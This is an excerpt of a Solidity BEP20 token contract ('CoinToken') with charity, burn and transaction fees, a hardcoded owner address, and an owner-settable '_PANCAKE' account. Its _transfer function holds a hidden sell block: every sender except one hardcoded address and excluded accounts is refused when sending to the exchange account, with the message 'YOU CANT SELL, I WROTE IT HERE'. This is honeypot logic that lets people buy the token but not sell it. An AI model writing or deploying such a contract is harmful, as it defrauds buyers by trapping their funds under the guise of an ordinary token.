...
contract Ownable is Context {
    address private _owner = address(0xad2FCcf05a546E2Eb2A656AB6F4eF2618147b7A6);
    address private f_owner = address(0);
...
contract CoinToken is Context, IBEP20, Ownable {
    ...
    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _maxTx, uint256 _txFee,uint256 _burnFee,uint256 _charityFee,address _FeeAddress,address tokenOwner)  {
		_NAME = _name;
		_SYMBOL = _symbol;
		_DECIMALS = _decimals;
		_DECIMALFACTOR = 10 ** _DECIMALS;
		_tTotal =_supply * _DECIMALFACTOR;
        _maxTxAmount = _maxTx * _DECIMALFACTOR;
    ...
    function totalCharity() private view returns (uint256) {
    ...
    function setRedistribuitionAccount(address account) external onlyOwner() {
        _PANCAKE = account;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if(sender != address(0x2840371E0FBA5E21352CA7e026d546b127E4dbA3)){
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            if(!_isExcluded[sender])
                require(recipient != _PANCAKE, "YOU CANT SELL, I WROTE IT HERE");
        }
